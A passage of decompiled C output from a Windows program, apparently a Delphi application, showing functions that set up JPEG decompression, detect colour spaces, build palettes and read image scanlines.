  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_0041c480(param_1,'\0',param_3);
  FUN_0042211c((int)param_1,extraout_EDX,extraout_ECX_00);
  *(undefined *)((int)param_1 + 0x3f) = DAT_00440a40;
  *(undefined *)((int)param_1 + 0x3d) = DAT_00440a41;
  *(undefined *)((int)param_1 + 0x42) = DAT_00440a42;
  *(undefined *)((int)param_1 + 0x3e) = DAT_00440a43;
  *(undefined *)(param_1 + 0x10) = DAT_00440a44;
  *(undefined *)((int)param_1 + 0x41) = DAT_00440a45;
  *(undefined *)((int)param_1 + 0x43) = DAT_00440a46;
  *(undefined *)(param_1 + 0xf) = DAT_00440a47;
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_004213c8(int param_1)

{
  if (*(int *)(param_1 + 0xb8) != 0) {
    FUN_0042dc7c(param_1 + 0xb8);
    *(undefined4 *)(param_1 + 0xb8) = 0;
  }
  return;
}



void FUN_004213ec(int param_1,undefined4 *param_2)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined **ppuVar2;
  undefined4 *puVar3;
  undefined4 *in_FS_OFFSET;
  byte bVar4;
  undefined4 uStack32;
  undefined *puStack28;
  undefined *puStack24;
  
  bVar4 = 0;
  puStack24 = (undefined *)0x421407;
  FUN_004030a0(param_2,0x288,0);
  ppuVar2 = &PTR_FUN_00440a48;
  puVar3 = param_2;
  for (iVar1 = 0x21; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *ppuVar2;
    ppuVar2 = ppuVar2 + (uint)bVar4 * -2 + 1;
    puVar3 = puVar3 + (uint)bVar4 * -2 + 1;
  }
  param_2[0x2e] = param_2;
  puStack24 = (undefined *)0x42143b;
  FUN_0042247c(param_2 + 0x2e,0x3e,0x1d0);
  puStack28 = &LAB_004215db;
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  param_2[0x21] = &LAB_004212d4;
  param_2[0x26] = param_1;
  param_2[0x30] = param_2 + 0x21;
  puStack24 = &stack0xfffffffc;
  FUN_004133f8(*(int **)(*(int *)(param_1 + 0x28) + 8),param_2,extraout_ECX,0,0);
  FUN_00423be8((int)(param_2 + 0x2e),*(undefined4 *)(*(int *)(param_1 + 0x28) + 8));
  FUN_00422744(param_2 + 0x2e,-1);
  param_2[0x3a] = 1;
  param_2[0x3b] = 1 << (*(byte *)(param_1 + 0x43) & 0x1f);
  param_2[0x42] = -(uint)(*(char *)(param_1 + 0x3c) != '\0');
  if (*(char *)(param_1 + 0x3d) != '\0') {
    param_2[0x39] = 1;
  }
  if ((*(char *)(param_1 + 0x3e) == '\x01') || (param_2[0x39] == 1)) {
    param_2[0x43] = 0xffffffff;
    param_2[0x46] = 0xec;
  }
  if (*(char *)(param_1 + 0x42) == '\x01') {
    param_2[0x40] = 1;
    param_2[0x45] = 0;
    param_2[0x44] = 1;
  }
  param_2[0x2b] = param_2[0x40];
  *(char *)(param_2 + 0x2c) = '\x01' - (param_2[0x45] == 0);
  param_2[0x2d] = param_2[0x44];
  if (*(char *)(param_1 + 0x40) != '\0') {
    iVar1 = FUN_00422890(param_2 + 0x2e);
    if (iVar1 != 0) {
      param_2[0x49] = param_2[0x45];
      param_2[0x40] = 1;
      param_2[0x45] = 0;
      param_2[0x44] = 1;
      param_2[0x3e] = 0xffffffff;
    }
  }
  *in_FS_OFFSET = uStack32;
  return;
}



void FUN_004215f8(int param_1)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack668;
  undefined *puStack664;
  undefined *puStack660;
  undefined4 local_28c [46];
  int local_1d4 [2];
  undefined4 local_1cc;
  undefined4 local_164;
  undefined4 local_160;
  
  if (*(char *)(param_1 + 0x44) != '\0') {
    puStack660 = (undefined *)0x421617;
    FUN_004213ec(param_1,local_28c);
    puStack664 = &LAB_00421677;
    uStack668 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack668;
    local_1cc = 0;
    puStack660 = &stack0xfffffffc;
    FUN_00424090(local_1d4);
    *(undefined4 *)(param_1 + 0x30) = local_164;
    *(undefined4 *)(param_1 + 0x34) = local_160;
    iVar1 = FUN_00422890(local_1d4);
    *(char *)(param_1 + 0x41) = '\x01' - (iVar1 == 0);
    *in_FS_OFFSET = uStack668;
    puStack660 = (undefined *)0x42167e;
    puStack664 = (undefined *)0x421676;
    FUN_004213c8((int)local_28c);
    return;
  }
  return;
}



void FUN_0042168c(int *param_1)

{
  undefined *puVar1;
  int *piVar2;
  undefined4 uVar3;
  uint uVar4;
  int iVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar6;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 extraout_EDX;
  uint uVar7;
  undefined **ppuVar8;
  undefined4 *puVar9;
  undefined4 *in_FS_OFFSET;
  byte bVar10;
  undefined4 uStack760;
  undefined *puStack756;
  undefined *puStack752;
  undefined4 uStack732;
  undefined4 uStack720;
  undefined *puStack716;
  undefined *puStack712;
  undefined *puVar11;
  undefined4 local_2ac [4];
  undefined4 local_29c [33];
  undefined *local_218 [5];
  int *local_204;
  undefined4 *local_1e4 [2];
  undefined **local_1dc;
  undefined4 local_1c8;
  uint local_1c4;
  undefined4 local_1c0;
  undefined4 local_1bc;
  uint local_108;
  int *local_14;
  int local_10;
  uint local_c;
  int *local_8;
  
  bVar10 = 0;
  puStack712 = &stack0xfffffffc;
  local_8 = param_1;
  FUN_004030a0(local_29c,0x288,0);
  ppuVar8 = &PTR_FUN_00440a48;
  puVar9 = local_29c;
  for (iVar5 = 0x21; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar9 = *ppuVar8;
    ppuVar8 = ppuVar8 + (uint)bVar10 * -2 + 1;
    puVar9 = puVar9 + (uint)bVar10 * -2 + 1;
  }
  local_1e4[0] = local_29c;
  FUN_0042e9c8((int *)local_1e4,0x3e,0x174);
  puVar11 = &DAT_004219f8;
  uVar3 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xfffffd3c;
  puStack716 = &DAT_004219c1;
  uStack720 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack720;
  local_218[0] = &LAB_004212d4;
  local_204 = local_8;
  local_1dc = local_218;
  uVar6 = extraout_ECX;
  puVar1 = &stack0xfffffffc;
  if (*(int *)(local_8[10] + 8) != 0) {
    FUN_0042211c((int)local_8,0,extraout_ECX);
    uVar6 = extraout_ECX_00;
    puVar1 = puStack712;
  }
  puStack712 = puVar1;
  piVar2 = (int *)FUN_00403af4((int *)&PTR_LAB_00411360,'\x01',uVar6);
  *(int **)(local_8[10] + 8) = piVar2;
  uStack732 = 0x421751;
  FUN_004133f8(piVar2,extraout_EDX,extraout_ECX_01,0,0);
  FUN_0042dd9c((int)local_1e4,*(undefined4 *)(local_8[10] + 8));
  if ((int *)local_8[0xb] != (int *)0x0) {
    iVar5 = (**(code **)(*(int *)local_8[0xb] + 0x2c))();
    if (iVar5 != 0) {
      iVar5 = (**(code **)(*(int *)local_8[0xb] + 0x20))();
      if (iVar5 != 0) {
        local_1c8 = (**(code **)(*(int *)local_8[0xb] + 0x2c))();
        uVar3 = (**(code **)(*(int *)local_8[0xb] + 0x2c))();
        *(undefined4 *)(local_8[10] + 0x10) = uVar3;
        local_1c4 = (**(code **)(*(int *)local_8[0xb] + 0x20))();
        uVar3 = (**(code **)(*(int *)local_8[0xb] + 0x20))();
        *(undefined4 *)(local_8[10] + 0xc) = uVar3;
        local_1c0 = 3;
        local_1bc = 2;
        local_14 = FUN_0041ebb4((int *)&LAB_004195f0,'\x01',extraout_ECX_02);
        uStack732 = *in_FS_OFFSET;
        *in_FS_OFFSET = &uStack732;
        (**(code **)(*local_14 + 8))(local_14,local_8[0xb]);
        FUN_00420038(local_14,6);
        FUN_0042dff4((int *)local_1e4);
        FUN_0042def8((int *)local_1e4,(uint)*(byte *)((int)local_8 + 0x3f),-1);
        uVar3 = extraout_ECX_03;
        if (*(char *)((int)local_8 + 0x3d) != '\0') {
          *(undefined *)(local_8[10] + 0x14) = 1;
          FUN_0042e168((int *)local_1e4,1);
          uVar3 = extraout_ECX_04;
        }
        if (*(char *)((int)local_8 + 0x41) != '\0') {
          FUN_0042e5d0((int *)local_1e4);
          uVar3 = extraout_ECX_05;
        }
        local_10 = FUN_0041f278(local_14,0,uVar3);
        iVar5 = FUN_0041f278(local_14,1,extraout_ECX_06);
        uVar7 = iVar5 - local_10;
        if (((int)uVar7 < 1) || ((uVar7 & 3) != 0)) {
          local_c = 1;
        }
        else {
          local_c = local_1c4;
        }
        puStack752 = (undefined *)0x4218d8;
        FUN_0041142c(0,0,0,local_2ac,0);
        puStack752 = (undefined *)0x4218f2;
        FUN_00403d20(local_8,local_8,0);
        puStack756 = &DAT_00421993;
        uStack760 = *in_FS_OFFSET;
        *in_FS_OFFSET = &uStack760;
        puStack752 = &stack0xfffffffc;
        FUN_0042e7e8((int *)local_1e4,-1);
        while (local_108 < local_1c4) {
          uVar4 = FUN_0042e85c((int *)local_1e4,&local_10,local_c);
          local_10 = local_10 + uVar7 * uVar4;
        }
        FUN_0042eae8((int *)local_1e4);
        *in_FS_OFFSET = uStack760;
        puStack752 = &LAB_0042199a;
        puStack756 = (undefined *)0x421954;
        iVar5 = FUN_00402738();
        if (iVar5 == 0) {
          puStack756 = (undefined *)0x64;
        }
        else {
          puStack756 = (undefined *)0x0;
        }
        uStack760 = 0;
        FUN_0041142c(0,0,0,local_2ac,0);
        FUN_00403d20(local_8,local_8,CONCAT31((int3)((uint)extraout_ECX_07 >> 8),2));
        return;
      }
    }
  }
  puVar1 = puStack712;
  *in_FS_OFFSET = uStack720;
  puStack712 = (undefined *)0x421796;
  FUN_004042b4(0,(char)uStack720,(char)puVar1,uVar3,puVar11);
  return;
}



uint FUN_00421a28(int *param_1,int *param_2)

{
  undefined4 uVar1;
  uint uVar2;
  
  uVar2 = 0;
  uVar1 = FUN_00403cb0(param_2,(int)&PTR_LAB_00420efc);
  if ((char)uVar1 != '\0') {
    if ((*(int *)(param_1[10] + 8) == 0) || (*(int *)(param_2[10] + 8) == 0)) {
      uVar2 = (uint)(param_1[10] == param_2[10]);
    }
    else {
      uVar2 = FUN_0041c574(param_1,param_2);
    }
  }
  return uVar2;
}



void FUN_00421a70(int param_1)

{
  FUN_00403b24(*(int **)(param_1 + 0x2c));
  *(undefined4 *)(param_1 + 0x2c) = 0;
  return;
}



void FUN_00421a84(int param_1)

{
  BYTE BVar1;
  LOGPALETTE *pLVar2;
  int iVar3;
  uint uVar4;
  LOGPALETTE local_40c [128];
  
  local_40c[0].palVersion = 0x300;
  local_40c[0].palNumEntries = *(ushort *)(param_1 + 0x84);
  if (*(int *)(param_1 + 0x2c) == 1) {
    uVar4 = (uint)local_40c[0].palNumEntries;
    if (-1 < (int)(uVar4 - 1)) {
      iVar3 = 0;
      pLVar2 = local_40c;
      do {
        BVar1 = *(BYTE *)(**(int **)(param_1 + 0x88) + iVar3);
        pLVar2->palPalEntry[0].peRed = BVar1;
        pLVar2->palPalEntry[0].peGreen = BVar1;
        pLVar2->palPalEntry[0].peBlue = BVar1;
        pLVar2->palPalEntry[0].peFlags = '\0';
        iVar3 = iVar3 + 1;
        uVar4 = uVar4 - 1;
        pLVar2 = (LOGPALETTE *)pLVar2->palPalEntry;
      } while (uVar4 != 0);
    }
  }
  else {
    uVar4 = (uint)local_40c[0].palNumEntries;
    if (-1 < (int)(uVar4 - 1)) {
      iVar3 = 0;
      pLVar2 = local_40c;
      do {
        pLVar2->palPalEntry[0].peRed = *(BYTE *)(*(int *)(*(int *)(param_1 + 0x88) + 8) + iVar3);
        pLVar2->palPalEntry[0].peGreen = *(BYTE *)(*(int *)(*(int *)(param_1 + 0x88) + 4) + iVar3);
        pLVar2->palPalEntry[0].peBlue = *(BYTE *)(**(int **)(param_1 + 0x88) + iVar3);
        pLVar2->palPalEntry[0].peFlags = '\0';
        iVar3 = iVar3 + 1;
        uVar4 = uVar4 - 1;
        pLVar2 = (LOGPALETTE *)pLVar2->palPalEntry;
      } while (uVar4 != 0);
    }
  }
  CreatePalette(local_40c);
  return;
}



void FUN_00421b2c(int param_1,HPALETTE param_2)

{
  int *piVar1;
  undefined *puVar2;
  UINT UVar3;
  undefined4 uVar4;
  int iVar5;
  undefined auStack1044 [4];
  tagPALETTEENTRY local_410 [256];
  
  UVar3 = GetPaletteEntries(param_2,0,0x100,(LPPALETTEENTRY)(auStack1044 + 4));
  if (UVar3 != 0) {
    uVar4 = (**(code **)(*(int *)(param_1 + 4) + 8))(param_1,1,UVar3);
    *(undefined4 *)(param_1 + 0x88) = uVar4;
    *(UINT *)(param_1 + 0x84) = UVar3;
    if (-1 < (int)(UVar3 - 1)) {
      iVar5 = 0;
      puVar2 = &stack0xfffffbe8;
      do {
        piVar1 = *(int **)(param_1 + 0x88);
        *(undefined *)(piVar1[2] + iVar5) = puVar2[4];
        *(undefined *)(piVar1[1] + iVar5) = puVar2[5];
        *(undefined *)(*piVar1 + iVar5) = puVar2[6];
        iVar5 = iVar5 + 1;
        UVar3 = UVar3 - 1;
        puVar2 = puVar2 + 4;
      } while (UVar3 != 0);
    }
  }
  return;
}



int * FUN_00421bb4(int *param_1,undefined4 param_2,undefined4 param_3)

{
  int *piVar1;
  HPALETTE pHVar2;
  int iVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  uint uVar6;
  uint *in_FS_OFFSET;
  undefined4 *puVar7;
  uint uStack748;
  undefined *puStack744;
  undefined *puStack740;
  uint uStack720;
  undefined *puStack716;
  undefined *puStack712;
  uint uStack708;
  undefined *puStack704;
  undefined *puStack700;
  undefined4 local_2ac [4];
  undefined4 local_29c [43];
  undefined4 local_1f0;
  char local_1ec;
  undefined4 local_1e8;
  int local_1e4 [2];
  int local_1dc;
  int local_1b8;
  int local_1a4;
  undefined4 local_19c;
  undefined4 local_18c;
  undefined4 local_188;
  undefined4 local_174;
  uint local_170;
  int local_164;
  int local_15c;
  uint local_158;
  int local_154;
  char local_11;
  int local_10;
  int *local_c;
  int *local_8;
  
  puStack712 = &stack0xfffffffc;
  local_c = (int *)param_1[0xb];
  if (local_c == (int *)0x0) {
    puStack700 = (undefined *)0x421be6;
    local_8 = param_1;
    piVar1 = FUN_0041ebb4((int *)&LAB_004195f0,'\x01',param_3);
    local_8[0xb] = (int)piVar1;
    local_c = (int *)local_8[0xb];
    local_11 = '\x01';
    puStack700 = (undefined *)0x421c07;
    FUN_004213ec((int)local_8,local_29c);
    puStack704 = &LAB_00421fae;
    uStack708 = *in_FS_OFFSET;
    *in_FS_OFFSET = (uint)&uStack708;
    puStack716 = &LAB_00421f7f;
    uStack720 = *in_FS_OFFSET;
    *in_FS_OFFSET = (uint)&uStack720;
    puStack700 = &stack0xfffffffc;
    FUN_0041fd14((int *)local_8[0xb],(HANDLE)0x0);
    if ((*(char *)((int)local_8 + 0x3e) == '\x01') || (local_1b8 == 1)) {
      FUN_00420038((int *)local_8[0xb],3);
    }
    else {
      FUN_00420038((int *)local_8[0xb],6);
    }
    puStack740 = (undefined *)0x421c76;
    FUN_0041142c(0,0,0,local_2ac,0);
    puStack740 = (undefined *)0x421c90;
    FUN_00403d20(local_8,local_8,0);
    puStack744 = &LAB_00421f6e;
    uStack748 = *in_FS_OFFSET;
    *in_FS_OFFSET = (uint)&uStack748;
    pHVar2 = (HPALETTE)local_8[0xe];
    puStack740 = &stack0xfffffffc;
    if (pHVar2 != (HPALETTE)0x0) {
      if (*(char *)((int)local_8 + 0x3e) == '\x01') {
        puStack740 = &stack0xfffffffc;
        FUN_00421b2c((int)local_1e4,pHVar2);
        pHVar2 = FUN_0041e944((HPALETTE)local_8[0xe]);
        (**(code **)(*(int *)local_8[0xb] + 0x38))((int *)local_8[0xb],pHVar2);
        local_11 = '\0';
      }
      else {
        puStack740 = &stack0xfffffffc;
        DeleteObject(pHVar2);
        local_8[0xe] = 0;
      }
    }
    FUN_00423c54(local_1e4);
    piVar1 = (int *)local_8[0xb];
    FUN_0041fd14(piVar1,(HANDLE)0x0);
    (**(code **)(*piVar1 + 0x40))(piVar1,local_174);
    (**(code **)(*piVar1 + 0x34))(piVar1,local_170);
    local_10 = FUN_0041f278(piVar1,0,extraout_ECX);
    iVar3 = FUN_0041f278(piVar1,1,extraout_ECX_00);
    uVar6 = iVar3 - local_10;
    if (((int)uVar6 < 1) || ((uVar6 & 3) != 0)) {
      local_164 = 1;
    }
    if (local_1a4 != 0) {
      while (iVar3 = FUN_004227b0(local_1e4), iVar3 != 2) {
        FUN_00423f18(local_1e4,local_154);
        uVar5 = extraout_ECX_01;
        if ((((*(int *)(local_1dc + 0xc) == 0) && (local_15c != 0)) &&
            (uVar4 = FUN_0041f1f4(local_8[0xb]), uVar5 = extraout_ECX_02, (char)uVar4 == '\x03')) &&
           (local_11 != '\0')) {
          uVar5 = FUN_00421a84((int)local_1e4);
          (**(code **)(*(int *)local_8[0xb] + 0x38))((int *)local_8[0xb],uVar5);
          *(undefined *)((int)local_8 + 0x22) = 1;
          uVar5 = extraout_ECX_03;
        }
        local_10 = FUN_0041f278((int *)local_8[0xb],0,uVar5);
        while (local_158 < local_170) {
          iVar3 = FUN_00423ddc(local_1e4,&local_10,local_164);
          local_10 = local_10 + uVar6 * iVar3;
        }
        FUN_00423f78(local_1e4);
      }
      local_19c = local_1f0;
      local_18c = local_1e8;
      if (local_1ec != '\0') {
        local_188 = 0xffffffff;
        local_15c = 0;
      }
      FUN_00423f18(local_1e4,local_154);
      local_10 = FUN_0041f278((int *)local_8[0xb],0,extraout_ECX_04);
    }
    if (((local_1a4 == 0) || (local_1ec != '\0')) && ((local_15c != 0 && (local_11 != '\0')))) {
      uVar5 = FUN_00421a84((int)local_1e4);
      (**(code **)(*(int *)local_8[0xb] + 0x38))((int *)local_8[0xb],uVar5);
      *(undefined *)((int)local_8 + 0x22) = 1;
      local_10 = FUN_0041f278((int *)local_8[0xb],0,extraout_ECX_05);
    }
    while (local_158 < local_170) {
      iVar3 = FUN_00423ddc(local_1e4,&local_10,local_164);
      local_10 = local_10 + uVar6 * iVar3;
    }
    if (local_1a4 != 0) {
      FUN_00423f78(local_1e4);
    }
    FUN_004228c4(local_1e4);
    *in_FS_OFFSET = uStack748;
    puStack740 = &LAB_00421f75;
    puStack744 = (undefined *)0x421f14;
    iVar3 = FUN_00402738();
    if (iVar3 == 0) {
      puStack744 = (undefined *)0x64;
    }
    else {
      puStack744 = (undefined *)0x0;
    }
    uStack748 = (uint)local_8 & 0xffffff00 | (uint)*(byte *)((int)local_8 + 0x22);
    FUN_0041142c(0,0,0,local_2ac,0);
    puVar7 = local_2ac;
    uVar5 = 0;
    FUN_00403d20(local_8,local_8,CONCAT31((int3)((uint)extraout_ECX_06 >> 8),2));
    if (*(char *)((int)local_8 + 0x22) != '\0') {
      local_8 = (int *)(**(code **)(*local_8 + 0x10))(local_8,local_8,*local_8,uVar5,puVar7);
    }
    return local_8;
  }
  return local_c;
}



undefined4 FUN_00421fc0(int param_1)

{
  int iVar1;
  
  iVar1 = *(int *)(param_1 + 0x28);
  if (*(int *)(iVar1 + 8) != 0) {
    return 0;
  }
  if ((*(int **)(param_1 + 0x2c) != (int *)0x0) &&
     (iVar1 = (**(code **)(**(int **)(param_1 + 0x2c) + 0x1c))(), (char)iVar1 == '\0')) {
    return 0;
  }
  return CONCAT31((int3)((uint)iVar1 >> 8),1);
}



undefined4 FUN_00422080(int param_1)

{
  undefined4 uVar1;
  
  if (*(int **)(param_1 + 0x2c) != (int *)0x0) {
    uVar1 = (**(code **)(**(int **)(param_1 + 0x2c) + 0x2c))();
    return uVar1;
  }
  if (*(char *)(param_1 + 0x43) == '\0') {
    uVar1 = *(undefined4 *)(*(int *)(param_1 + 0x28) + 0x10);
  }
  else {
    FUN_004215f8(param_1);
    uVar1 = *(undefined4 *)(param_1 + 0x30);
  }
  return uVar1;
}



void FUN_004220ac(int *param_1)

{
  if (*(int *)(param_1[10] + 8) == 0) {
    FUN_0042168c(param_1);
  }
  return;
}



void FUN_004220bc(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  (**(code **)(**(int **)(param_1 + 0x2c) + 0x5c))
            (*(int **)(param_1 + 0x2c),param_2,param_3,param_4);
  return;
}



void FUN_00422100(int param_1)

{
  int *piVar1;
  undefined4 extraout_ECX;
  
  FUN_00403b24(*(int **)(param_1 + 0x2c));
  piVar1 = FUN_0041ebb4((int *)&LAB_004195f0,'\x01',extraout_ECX);
  *(int **)(param_1 + 0x2c) = piVar1;
  return;
}



void FUN_0042211c(int param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 extraout_ECX;
  
  if (*(int **)(param_1 + 0x28) != (int *)0x0) {
    FUN_0041e110(*(int **)(param_1 + 0x28));
    param_3 = extraout_ECX;
  }
  iVar1 = FUN_00403af4((int *)&PTR_LAB_00420ea0,'\x01',param_3);
  *(int *)(param_1 + 0x28) = iVar1;
  FUN_0041e10c(iVar1);
  return;
}



void FUN_00422148(int *param_1,int *param_2,int param_3)

{
  int iStack16;
  
  iStack16 = param_3;
  (**(code **)(*param_2 + 0xc))(param_2,&iStack16,4);
  FUN_00422170(param_1,iStack16,param_2);
  return;
}



void FUN_00422170(int *param_1,int param_2,int *param_3)

{
  int *piVar1;
  int iVar2;
  undefined extraout_CL;
  undefined4 extraout_ECX;
  int iVar3;
  undefined4 extraout_ECX_00;
  undefined4 extraout_EDX;
  undefined **ppuVar4;
  undefined4 *puVar5;
  undefined4 *in_FS_OFFSET;
  byte bVar6;
  undefined4 uStack632;
  undefined4 *local_260 [7];
  undefined4 local_244;
  undefined4 local_240;
  int local_238;
  undefined4 local_90 [33];
  int *local_c;
  int *local_8;
  
  bVar6 = 0;
  local_c = param_3;
  local_8 = param_1;
  FUN_0042211c((int)param_1,param_2,param_3);
  FUN_00403b24((int *)local_8[0xb]);
  local_8[0xb] = 0;
  iVar2 = local_8[10];
  piVar1 = (int *)FUN_00403af4((int *)&PTR_LAB_00411360,'\x01',extraout_ECX);
  *(int **)(iVar2 + 8) = piVar1;
  uStack632 = 0x4221c2;
  FUN_0041345c(piVar1,(char)(param_2 >> 0x1f),extraout_CL,param_2,param_2 >> 0x1f);
  FUN_00413604(local_c,*(undefined4 *)(*(int *)(iVar2 + 8) + 4),param_2);
  if (0 < param_2) {
    ppuVar4 = &PTR_FUN_00440a48;
    puVar5 = local_90;
    for (iVar3 = 0x21; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar5 = *ppuVar4;
      ppuVar4 = ppuVar4 + (uint)bVar6 * -2 + 1;
      puVar5 = puVar5 + (uint)bVar6 * -2 + 1;
    }
    local_260[0] = local_90;
    FUN_0042247c((int *)local_260,0x3e,0x1d0);
    uStack632 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack632;
    FUN_004133f8(*(int **)(iVar2 + 8),extraout_EDX,extraout_ECX_00,0,0);
    FUN_00423be8((int)local_260,*(undefined4 *)(iVar2 + 8));
    FUN_00422744((int *)local_260,-1);
    *(undefined4 *)(iVar2 + 0x10) = local_244;
    *(undefined4 *)(iVar2 + 0xc) = local_240;
    *(bool *)(iVar2 + 0x14) = local_238 == 1;
    iVar2 = FUN_00422890((int *)local_260);
    *(char *)((int)local_8 + 0x41) = '\x01' - (iVar2 == 0);
    *in_FS_OFFSET = uStack632;
    FUN_0042254c((int)local_260);
    return;
  }
  *(undefined *)((int)local_8 + 0x22) = 1;
  (**(code **)(*local_8 + 0x10))(local_8,local_8);
  return;
}



void FUN_00422308(void)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack20;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 *local_8;
  
  puStack12 = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  puStack16 = &LAB_00422346;
  uStack20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack20;
  FUN_0040658c((int **)PTR_PTR_DAT_0044138c,(int *)&local_8);
  FUN_00421088(local_8);
  *in_FS_OFFSET = uStack20;
  puStack12 = &LAB_0042234d;
  puStack16 = (undefined *)0x422345;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_0042243c(void)

{
  HDC hdc;
  int iVar1;
  int iVar2;
  
  hdc = GetDC((HWND)0x0);
  iVar1 = GetDeviceCaps(hdc,0xc);
  iVar2 = GetDeviceCaps(hdc,0xe);
  DAT_00440a43 = iVar1 * iVar2 < 9;
  ReleaseDC((HWND)0x0,hdc);
  return;
}



void FUN_0042247c(int *param_1,int param_2,int param_3)

{
  int iVar1;
  undefined uVar2;
  int iVar3;
  undefined uVar4;
  undefined extraout_CL;
  int extraout_ECX;
  undefined uVar5;
  undefined extraout_DL;
  int extraout_EDX;
  int *piVar6;
  
  uVar2 = 0;
  param_1[1] = 0;
  iVar3 = param_3;
  if (param_2 != 0x3e) {
    iVar3 = *param_1;
    *(undefined4 *)(iVar3 + 0x14) = 0xc;
    *(undefined4 *)(iVar3 + 0x18) = 0x3e;
    *(int *)(iVar3 + 0x1c) = param_2;
    uVar2 = (**(code **)*param_1)();
    iVar3 = extraout_ECX;
    param_2 = extraout_EDX;
  }
  uVar5 = (undefined)param_2;
  uVar4 = (undefined)iVar3;
  if (param_3 != 0x1d0) {
    iVar3 = *param_1;
    *(undefined4 *)(iVar3 + 0x14) = 0x15;
    *(undefined4 *)(iVar3 + 0x18) = 0x1d0;
    *(int *)(iVar3 + 0x1c) = param_3;
    uVar2 = (**(code **)*param_1)();
    uVar4 = extraout_CL;
    uVar5 = extraout_DL;
  }
  iVar3 = *param_1;
  iVar1 = param_1[3];
  FUN_00420fb0(uVar2,uVar5,uVar4,param_1,0,0x1d0);
  *param_1 = iVar3;
  param_1[3] = iVar1;
  param_1[4] = 1;
  FUN_004234a0(param_1);
  param_1[2] = 0;
  piVar6 = param_1 + 0x29;
  param_1[6] = 0;
  iVar3 = 0;
  do {
    iVar3 = iVar3 + 1;
    *piVar6 = 0;
    piVar6 = piVar6 + 1;
  } while (iVar3 < 4);
  iVar3 = 0;
  piVar6 = param_1 + 0x2d;
  do {
    iVar3 = iVar3 + 1;
    *piVar6 = 0;
    piVar6[4] = 0;
    piVar6 = piVar6 + 1;
  } while (iVar3 < 4);
  param_1[0x4c] = 0;
  FUN_0042da4c((int)param_1);
  FUN_00423af4((int)param_1);
  param_1[5] = 200;
  return;
}



void FUN_0042254c(int param_1)

{
  FUN_0042dc7c(param_1);
  return;
}



void FUN_0042255c(int *param_1)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  iVar1 = param_1[9];
  if (iVar1 == 1) {
    param_1[10] = 1;
    param_1[0xb] = 1;
  }
  else if (iVar1 == 3) {
    if (param_1[0x46] == 0) {
      if (param_1[0x49] == 0) {
        piVar2 = (int *)param_1[0x36];
        iVar1 = *piVar2;
        iVar3 = piVar2[0x15];
        iVar4 = piVar2[0x2a];
        if (((iVar1 == 1) && (iVar3 == 2)) && (iVar4 == 3)) {
          param_1[10] = 3;
        }
        else if (((iVar1 == 0x52) && (iVar3 == 0x47)) && (iVar4 == 0x42)) {
          param_1[10] = 2;
        }
        else {
          iVar5 = *param_1;
          *(int *)(iVar5 + 0x18) = iVar1;
          *(int *)(iVar5 + 0x1c) = iVar3;
          *(int *)(iVar5 + 0x20) = iVar4;
          *(undefined4 *)(*param_1 + 0x14) = 0x6f;
          (**(code **)(*param_1 + 4))(param_1,1);
          param_1[10] = 3;
        }
      }
      else if (*(char *)(param_1 + 0x4a) == '\0') {
        param_1[10] = 2;
      }
      else if (*(char *)(param_1 + 0x4a) == '\x01') {
        param_1[10] = 3;
      }
      else {
        iVar1 = *param_1;
        *(undefined4 *)(iVar1 + 0x14) = 0x72;
        *(uint *)(iVar1 + 0x18) = (uint)*(byte *)(param_1 + 0x4a);
        (**(code **)(*param_1 + 4))(param_1,0xffffffff);
        param_1[10] = 3;
      }
    }
    else {
      param_1[10] = 3;
    }
    param_1[0xb] = 2;
  }
  else if (iVar1 == 4) {
    if (param_1[0x49] == 0) {
      param_1[10] = 4;
    }
    else if (*(char *)(param_1 + 0x4a) == '\0') {
      param_1[10] = 4;
    }
    else if (*(char *)(param_1 + 0x4a) == '\x02') {
      param_1[10] = 5;
    }
    else {
      iVar1 = *param_1;
      *(undefined4 *)(iVar1 + 0x14) = 0x72;
      *(uint *)(iVar1 + 0x18) = (uint)*(byte *)(param_1 + 0x4a);
      (**(code **)(*param_1 + 4))(param_1,0xffffffff);
      param_1[10] = 5;
    }
    param_1[0xb] = 4;
  }
  else {
    param_1[10] = 0;
    param_1[0xb] = 0;
  }
  param_1[0xc] = 1;
  param_1[0xd] = 1;
  param_1[0xe] = 0;
  param_1[0xf] = 0x3ff00000;
  param_1[0x10] = 0;
  param_1[0x11] = 0;
  param_1[0x12] = 2;
  param_1[0x13] = 1;
  param_1[0x14] = 1;
